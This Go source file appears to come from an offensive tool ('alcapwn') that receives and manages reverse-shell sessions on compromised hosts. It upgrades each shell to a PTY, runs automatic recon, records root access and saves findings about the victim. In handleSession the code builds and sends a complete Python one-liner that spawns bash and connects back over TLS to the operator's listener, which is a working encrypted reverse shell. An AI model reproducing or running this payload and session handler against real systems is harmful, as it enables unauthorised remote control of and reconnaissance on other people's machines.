package main

import (
	"crypto/ecdh"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"golang.org/x/term"
)

// sessionOpts holds all CLI flags and runtime references for a session.
type sessionOpts struct {
	verbosity   int
	autoRecon   bool // run recon automatically on connect (--recon flag)
	findingsDir string // where to save findings JSON; "" = don't save
	rawDir      string // where to save raw terminal capture; "" = don't save
	timeout     int
	// TLS fields — only populated when --tls is set; zero values when disabled.
	tlsEnabled     bool
	tlsCfg         *tls.Config
	fingerprint    string // colon-separated SHA-256, for display
	fingerprintHex string // lowercase hex without colons, for Python hashlib assert
	listenIP   string
	listenPort int
	// registerTLSWaiter is injected by acceptLoop.  Calling it before sending
	// the reconnect command registers the source IP in the pendingTLSUpgrade
	// routing table so acceptLoop routes the incoming connection to the channel
	// instead of creating a new session — even if Python connects back before
	// handleSession reaches its select.
	registerTLSWaiter func(origIP string) (<-chan net.Conn, func())
	// Agent session encryption — populated at startup from ~/.alcapwn/server_key.bin.
	// nil means no agent encryption (should not happen in production).
	serverKey         *ecdh.PrivateKey
	serverFingerprint string // SHA-256(serverPubKey) lowercase hex; shown at startup
	// Runtime dependencies injected by the console.
	printer  *consolePrinter
	registry *Registry
	// Persistence store for updating session metadata
	persist *PersistenceStore
	persistMu *sync.Mutex
}

// killRemoteProcessGroup attempts to kill any processes that may have been
// spawned by the remote shell to establish persistence. We use pgrep to find
// processes in the same session and send SIGKILL.
//
// This defends against pbsh's "Zombie Persistence" attack where pbsh does:
//
//	(pbsh_payload &) > /dev/null 2>&1
//
// Note: This requires that we can execute commands on the remote side.
// If the connection is already closed, we can only kill via socket shutdown.
func killRemoteProcessGroup(conn net.Conn) {
	// Try to send a command that will find and kill processes in our session
	killCmd := `pkill -9 -g $$ 2>/dev/null; pkill -9 -P $$ 2>/dev/null; exit 0`
	conn.Write([]byte(killCmd + "\n")) //nolint:errcheck
	time.Sleep(100 * time.Millisecond)
}

// sanitizeLabel strips any characters that aren't alphanumeric, '-', '_', or '.'
// to prevent path traversal when the label is used in findings filenames.
func sanitizeLabel(s string) string {
	var b strings.Builder
	for _, r := range s {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') ||
			(r >= '0' && r <= '9') || r == '-' || r == '_' || r == '.' {
			b.WriteRune(r)
		}
	}
	return b.String()
}

// hostFromAddr extracts the IP address (without port) from a net.Addr.
func hostFromAddr(addr net.Addr) string {
	host := addr.String()
	if strings.Contains(host, ":") {
		parts := strings.Split(host, ":")
		host = strings.Join(parts[:len(parts)-1], ":")
	}
	return host
}


// handleSession runs the full session lifecycle in a background goroutine:
//
//	PTY upgrade (spinner) → stop spinner → TLS (printer.Notify) → recon (silent) → background
//
// The spinner is stopped immediately after PTY upgrade so it never runs
// concurrently with consolePrinter.Notify — they share stdout with no
// shared lock, and concurrent writes produce the garbled output seen when
// --tls is active.  TLS and recon status are delivered via printer.Notify
// instead.  executeRecon receives reconIdx=-1 so its disp.set() calls are
// no-ops (idx<0 is a guard in statusDisplay.set()).
//
// The session is NOT closed when this function returns unless an error occurs.
func handleSession(sess *Session, opts sessionOpts) {
	conn := sess.Conn
	addr := conn.RemoteAddr()

	// ── Phase 1: PTY upgrade (with spinner) ─────────────────────────────────
	disp := newStatusDisplay()

	u := NewPTYUpgrader(conn, opts.verbosity, disp, opts.tlsEnabled)
	// No TLS or recon tasks added to the spinner — those phases are handled
	// via printer.Notify after the spinner is stopped.

	if err := u.Upgrade(); err != nil {
		disp.stop()
		opts.printer.Notify("[!] [%d] PTY upgrade failed: %v", sess.ID, err)
		conn.Close()
		opts.registry.Remove(sess.ID)
		return
	}

	// Stop and erase the spinner now.  Everything from this point forward uses
	// printer.Notify, which holds its own mutex.  Never let the spinner run
	// concurrently with Notify — they both write directly to stdout.
	disp.stop()
	disp.clear()

	// ── Phase 2: TLS reconnect (printer.Notify, no spinner) ─────────────────
	activeConn := conn

	if opts.tlsEnabled {
		if u.usedPython {
			effectiveListenIP := strings.Trim(hostFromAddr(conn.LocalAddr()), "[]")
			if effectiveListenIP == "" {
				effectiveListenIP = opts.listenIP
			}

			reconnectCmd := fmt.Sprintf(
				`%s -c "import socket,ssl,os,pty,threading,hashlib,subprocess as sp;m,sv=pty.openpty();p=sp.Popen(['/bin/bash'],stdin=sv,stdout=sv,stderr=sv,start_new_session=True,close_fds=True,pass_fds=[m]);os.close(sv);ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT);ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE;t=ctx.wrap_socket(socket.create_connection(('%s',%d),timeout=10));assert hashlib.sha256(t.getpeercert(binary_form=True)).hexdigest()=='%s';exec('def rd():\n try:\n  while 1:\n   d=t.read(4096)\n   if d:os.write(m,d)\n   else:break\n except:pass\nthreading.Thread(target=rd,daemon=True).start()\ntry:\n while 1:\n  d=os.read(m,4096)\n  t.write(d)\nexcept:pass')"`,
				u.pythonBin, effectiveListenIP, opts.listenPort, opts.fingerprintHex,
			)
			// Register BEFORE sending the command so acceptLoop routes the
			// incoming connection here even if Python connects back immediately.
			origIP := hostFromAddr(addr)
			reconnectCh, cancelWaiter := opts.registerTLSWaiter(origIP)
			defer cancelWaiter()

			u.write(reconnectCmd + "\n") //nolint:errcheck
			if opts.verbosity >= 1 {
				opts.printer.Notify("[*] [%d] Awaiting TLS reconnect from %s...", sess.ID, hostFromAddr(addr))
			}

			var rawConn net.Conn
			select {
			case rawConn = <-reconnectCh:
			case <-time.After(10 * time.Second):
				opts.printer.Notify("[!] [%d] Encryption upgrade failed — reconnect timed out.", sess.ID)
				conn.Close()
				opts.registry.Remove(sess.ID)
				return
			}

			buf := make([]byte, 1)
			rawConn.Read(buf) //nolint:errcheck
			if buf[0] != 0x16 {
				rawConn.Close()
				opts.printer.Notify("[!] [%d] Encryption upgrade failed — not a TLS handshake.", sess.ID)
				conn.Close()
				opts.registry.Remove(sess.ID)
				return
			}

			tlsCandidate := tls.Server(&prefixConn{Conn: rawConn, prefix: buf}, opts.tlsCfg)
			if err := tlsCandidate.Handshake(); err != nil {
				tlsCandidate.Close()
				opts.printer.Notify("[!] [%d] TLS handshake failed: %v", sess.ID, err)
				conn.Close()
				opts.registry.Remove(sess.ID)
				return
			}
			tlsConn := tlsCandidate

			// Switch to TLS.  Keep plain conn open — closing it sends SIGHUP to
			// the remote pty.spawn process and kills the Python TLS relay.
			activeConn = tlsConn
			u.switchConn(tlsConn)

			// The Python TLS relay spawns a fresh bash with a new PTY.
			// finalizeUpgrade() set TERM/stty on the *first* bash; the new bash
			// has default terminal settings.  Re-send setup so interactive mode
			// and recon see a properly configured shell.
			reinitTerminal(u)

			if opts.verbosity >= 1 {
				opts.printer.Notify("[*] [%d] Session encrypted (TLS).", sess.ID)
			}

		} else {
			if opts.verbosity >= 1 {
				opts.printer.Notify("[!] [%d] No Python detected — session running unencrypted.", sess.ID)
			}
		}
	}
	// ── end TLS reconnect ────────────────────────────────────────────────────

	// Store upgrader and active connection once, after TLS is resolved.
	sess.mu.Lock()
	sess.Upgrader = u
	sess.ActiveConn = activeConn
	if activeConn != conn {
		sess.TLS = true // upgraded to TLS in this session
	}
	sess.mu.Unlock()

	if !opts.autoRecon {
		opts.printer.Notify("[+] Session %d ready", sess.ID)
		return
	}

	host := hostFromAddr(addr)

	// ── Phase 3: Recon (silent — reconIdx=-1 suppresses all disp.set calls) ──
	//
	// Passing -1 as reconIdx means every disp.set(reconIdx, ...) inside
	// executeRecon hits the "idx < 0" guard and is a no-op, so the stopped
	// spinner never writes to stdout again.
	rawPath, sections, err := executeRecon(
		u, opts.rawDir, host, disp, -1,
		time.Duration(opts.timeout)*time.Second, opts.printer,
	)
	if err != nil {
		opts.printer.Notify("[!] [%d] Recon failed: %v", sess.ID, err)
		return
	}

	// Drain any prompt left in the bufio buffer after the recon sentinel.
	u.readUntilPrompt(1 * time.Second)

	findings := (&ReconParser{}).Parse(sections)
	matches := matchFindings(findings)

	sess.mu.Lock()
	sess.Findings = findings
	sess.Matches = matches
	// Initialise IsRoot from the recon snapshot so sessions that connected as
	// root don't require a live round-trip.
	if (findings.UID != nil && *findings.UID == "0") ||
		(findings.User != nil && *findings.User == "root") {
		sess.IsRoot = true
		sess.RootLevel = "uid"
	}
	sess.mu.Unlock()

	// Update session metadata in persistence store
	if opts.persist != nil {
		opts.persistMu.Lock()
		remoteAddr := sess.Conn.RemoteAddr()
		ip := hostFromAddr(remoteAddr)

		osName := ""
		if findings.OS != nil {
			osName = *findings.OS
		}
		hostname := ""
		if findings.Hostname != nil {
			hostname = *findings.Hostname
		}
		sessionMeta := SessionMetadata{
			ID:          sess.ID,
			Listener:    sess.ListenerAddr,
			OS:          osName,
			Hostname:    hostname,
			IP:          ip,
			Persistent:  false,
			LastSeen:    time.Now().Format(time.RFC3339),
			Labels:      []string{},
			Notes:       "",
		}

		// Copy existing labels, notes, name and persistent flag from any prior metadata.
		sess.mu.Lock()
		sessLabel := sess.Label
		sess.mu.Unlock()
		if existing, exists := opts.persist.Sessions[sess.ID]; exists {
			sessionMeta.Labels = existing.Labels
			sessionMeta.Notes = existing.Notes
			sessionMeta.Persistent = existing.Persistent
			sessionMeta.Name = existing.Name
		}
		// If the session has been renamed since last metadata save, update Name.
		if sessLabel != "" {
			sessionMeta.Name = sessLabel
		}
		opts.persist.Sessions[sess.ID] = sessionMeta
		opts.persistMu.Unlock()
	}

	if opts.verbosity >= 1 && rawPath != "" {
		opts.printer.Notify("[*] [%d] Raw output saved to: %s", sess.ID, rawPath)
	}

	if opts.findingsDir != "" {
		go func() {
			path := saveFindings(findings, opts.findingsDir, host, opts.printer)
			if opts.verbosity >= 1 && path != "" {
				opts.printer.Notify("[*] [%d] Findings saved to: %s", sess.ID, path)
			}
		}()
	}

	opts.printer.Notify("[+] Session %d ready", sess.ID)
}

// reinitTerminal re-sends the terminal setup commands to the shell currently
// attached to u.  Called after a TLS switchConn because the Python TLS relay
// spawns a fresh bash with a new PTY that has not had TERM or stty configured.
func reinitTerminal(u *PTYUpgrader) {
	cols, rows, err := term.GetSize(int(os.Stdin.Fd()))
	if err != nil || cols <= 0 || rows <= 0 {
		cols, rows = 220, 50
	}
	cmd := fmt.Sprintf(
		"export TERM=xterm-256color SHELL=/bin/bash; stty columns %d rows %d; echo ALCAPWN_TLS_REINIT\n",
		cols, rows,
	)
	u.write(cmd)                                              //nolint:errcheck
	u.readUntilSentinel("ALCAPWN_TLS_REINIT", 5*time.Second) //nolint:errcheck
	u.readUntilPrompt(1 * time.Second)                        //nolint:errcheck
}


func saveFindings(f *Findings, findingsDir string, host string, printer *consolePrinter) string {
	if err := os.MkdirAll(findingsDir, 0700); err != nil {
		printer.Notify("[!] Could not create findings directory: %v", err)
		return ""
	}

	timestamp := time.Now().Format("20060102_150405")
	filename := fmt.Sprintf("findings_%s_%s.json", host, timestamp)
	outpath := filepath.Join(findingsDir, filename)

	data, err := json.MarshalIndent(f, "", "  ")
	if err != nil {
		printer.Notify("[!] Could not marshal findings: %v", err)
		return ""
	}

	if err := os.WriteFile(outpath, data, 0600); err != nil {
		printer.Notify("[!] Could not save findings: %v", err)
		return ""
	}

	return outpath
}
